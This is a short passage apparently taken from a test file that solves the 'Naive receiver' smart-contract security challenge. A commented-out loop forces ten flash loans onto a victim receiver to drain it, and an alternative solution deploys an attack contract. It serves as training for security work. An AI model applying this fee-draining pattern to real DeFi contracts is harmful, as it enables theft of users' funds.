...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    // for (let i = 0; i < 10; i++) {
    //   await pool.connect(player).flashLoan(receiver.address, ETH, zero, "0x");
    // }

    // Solution B:

    const AttackFlashLoanReceiver = await ethers.getContractFactory(
      "AttackFlashLoanReceiver",
      player
    );

    await AttackFlashLoanReceiver.deploy(
      pool.address,
      receiver.address
    );
  });
